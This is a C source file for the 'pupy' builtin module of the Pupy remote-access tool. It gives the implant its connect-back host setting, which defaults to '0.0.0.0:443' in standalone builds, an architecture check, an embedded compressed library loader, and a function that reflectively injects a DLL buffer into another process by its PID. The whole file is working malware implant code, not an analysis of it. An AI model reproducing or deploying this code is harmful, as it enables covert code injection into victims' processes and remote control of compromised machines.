/*
  For the pupy_builtins compiled into pupy exe and reflective DLL stubs we need "Python-dynload.h".
  For the standalone .pyd we need <Python.h>
*/

#include "Python-dynload.h"
#include <stdio.h>
#include <windows.h>
#include "base_inject.h"
static char module_doc[] = "Builtins utilities for pupy";

extern const char resources_library_compressed_string_txt_start[];
extern const int resources_library_compressed_string_txt_size;
#ifndef STANDALONE
extern char connect_back_host[100];
#else
char connect_back_host[100] = "0.0.0.0:443";
#endif
extern const DWORD dwPupyArch;
static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args)
{
	return Py_BuildValue("s#", resources_library_compressed_string_txt_start, resources_library_compressed_string_txt_size);
}

static PyObject *
Py_get_connect_back_host(PyObject *self, PyObject *args)
{
	return Py_BuildValue("s", connect_back_host);
}
static PyObject *Py_get_arch(PyObject *self, PyObject *args)
{
	if(dwPupyArch==PROCESS_ARCH_X86){
		return Py_BuildValue("s", "x86");
	}
	else if(dwPupyArch==PROCESS_ARCH_X64){
		return Py_BuildValue("s", "x64");
	}
	return Py_BuildValue("s", "unknown");
}

static PyObject *
Py_reflective_inject_dll(PyObject *self, PyObject *args)
{
	DWORD dwPid;
	const char *lpDllBuffer;
	DWORD dwDllLenght;
	const char *cpCommandLine;
	PyObject* py_is64bit;
	int is64bits;
	if (!PyArg_ParseTuple(args, "Is#O", &dwPid, &lpDllBuffer, &dwDllLenght, &py_is64bit))
		return NULL;
	is64bits = PyObject_IsTrue(py_is64bit);
	if(is64bits){
		is64bits=PROCESS_ARCH_X64;
	}else{
		is64bits=PROCESS_ARCH_X86;
	}
	if(inject_dll( dwPid, lpDllBuffer, dwDllLenght, NULL, is64bits) != ERROR_SUCCESS)
		return NULL;
	return PyBool_FromLong(1);
}

static PyMethodDef methods[] = {
	{ "get_connect_back_host", Py_get_connect_back_host, METH_NOARGS, "get_connect_back_host() -> (ip, port)" },
	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
	{ "_get_compressed_library_string", Py_get_compressed_library_string, METH_VARARGS },
	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
	{ NULL, NULL },		/* Sentinel */
};

DL_EXPORT(void)
initpupy(void)
{
	Py_InitModule3("pupy", methods, module_doc);
}

